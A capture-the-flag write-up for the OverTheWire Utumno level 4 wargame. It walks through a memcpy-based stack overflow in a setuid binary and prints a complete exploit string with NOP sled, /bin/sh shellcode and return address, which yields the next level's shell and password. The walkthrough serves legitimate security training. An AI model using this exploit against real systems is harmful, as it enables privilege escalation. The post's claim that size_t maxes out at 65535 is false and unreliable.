---
layout: post
title: OverTheWire - Utumno4
---

Site: http://overthewire.org/wargames/utumno/ <br>
Level: 4<br>
Situation: Integer Overflow<br><br>

We start the way we usually do. Let’s create a temp folder to work from, get our arch type and run the application

{% highlight bash %}
utumno4@melinda:~$ mkdir /tmp/uh4
utumno4@melinda:~$ cd /tmp/uh4
{% endhighlight %}

{% highlight bash %}
utumno4@melinda:/tmp/uh4$ file /utumno/utumno4
/utumno/utumno4: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=f08e1d32ab3f918787ecb922b16945e4dfb18383, not stripped
{% endhighlight %}

{% highlight bash %}
utumno4@melinda:/tmp/uh4$ /utumno/utumno4
Segmentation fault
{% endhighlight %}

At first we are presented with an immediate segfault not generally a good start. But let’s pass in some parameters and see what happens.

{% highlight bash %}
utumno4@melinda:/tmp/uh4$ /utumno/utumno4 a a
{% endhighlight %}

Doesn’t crash so we know we have to pass in some values lets go ahead and download the file and look at it.

![Embeded](/images/utumno/utumno4/image1.jpg)
[FullSize](/images/utumno/utumno4/image1.jpg)

Simple execution flow lets go ahead and mark it up so we can see exactly what is going on.

![Embeded](/images/utumno/utumno4/image2.jpg)
[FullSize](/images/utumno/utumno4/image2.jpg)

Simple enough and we now know that memcpy is taking in our arguments directly without modifying them. This is vulnerable to what is known has an integer overflow. Let’s look at the memcpy definition.

{% highlight bash %}
void *memcpy(void *dest, const void *src, size_t n);
 {% endhighlight %}

We know our first variable is being converted to an int and is being used for "n". Or the size to copy. Size_T's max size is 65535 if we place a value larger then this we can cause a segfault. 

What this allows us to do is pass in a value larger than the max size and a string of equal length and run shell code. However one thing to keep in mind during this is the offset between main and the return function. 

First we test that a crash does occur.

{% highlight bash %}
utumno4@melinda:/tmp/uh4$ /utumno/utumno4 65536 a
Segmentation fault
{% endhighlight %}

We confirmed the crash now we need to see if we can control EIP with this crash. To do this we use Perl.

{% highlight bash %}
utumno4@melinda:/tmp/uh4$ strace /utumno/utumno4 65536 `perl -e 'print "A"x65536'`
-- SNIP --
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+++ killed by SIGSEGV +++
Segmentation fault
-- SNIP --
{% endhighlight %}

It works now all we have to do is find the offset. However things got werid. At this point when using metasploits offset pattern generation it returns a value of 4506 which when attempted didn't work. 

So it was a guessing game to narrow down the exact offset we needed. It ended up being 65294 so this turns our payload into the following.

{% highlight bash %}
/utumno/utumno4 65536 `perl -e 'print "\x90"x65273 . "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "AAAA" . "\x90"x238'`
{% endhighlight %}

It is important to note we still need the full memory space filled or the overflow will act up.

Finally we just need to find the address of our nopseld. Utilizing the invoker.sh script and removing COLUMNS and the LINES environmental variables we pick the address 0xffefde33 and turn our payload into the following.

{% highlight bash %}
65536 `perl -e 'print "\x90"x65273 . "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x33\xed\xfe\xff" . "\x90"x238'`
{% endhighlight %}

Run it and we get the following.

{% highlight bash %} 
utumno4@melinda:/tmp/uh4$ ./invoker.sh /utumno/utumno4 65536 `perl -e 'print "\x90"x65273 . "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x33\xed\xfe\xff" . "\x90"x238'`
$ whoami
utumno5
$ cat /etc/utumno_pass/utumno5
[OMITTED]
{% endhighlight %}

There is our password